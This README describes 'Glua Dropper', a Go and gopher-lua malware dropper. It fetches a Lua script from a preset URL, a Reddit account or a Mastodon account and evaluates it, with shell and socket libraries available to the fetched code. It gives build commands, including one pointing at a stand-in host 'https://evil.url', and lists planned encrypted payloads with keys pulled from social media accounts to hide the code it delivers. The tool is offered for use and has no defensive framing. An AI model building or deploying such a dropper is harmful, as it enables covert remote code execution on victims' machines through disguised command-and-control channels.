# Glua Dropper
## A simple dropper written in gopher-lua

The programs downloads a gopher-lua script from a preset url and evals it. Can download and run scripts from reddit.com and mastodon.social

### Building
Requires go-bindata

Build with ```./build.sh [site] [endPoint]```

#### Examples 

```./build.sh mastodon 0000000```
```./build.sh reddit accountName```
```./build.sh plaintext https://evil.url```

The reddit dropper takes an account name as the 2nd opt, mastodon takes an account ID 


### Requirements

The following libs are required 

"github.com/cjoudrey/gluahttp"
"github.com/nubix-io/gluasocket"
"github.com/otm/gluash"
"github.com/yuin/gopher-lua"
"layeh.com/gopher-json"

### TODO

#### Encryption
Add support for decypting evals using keys fetched from a url/reddit account 
Currently the crypto-lib only supports aes-cbc. Suppoer for RSA should be added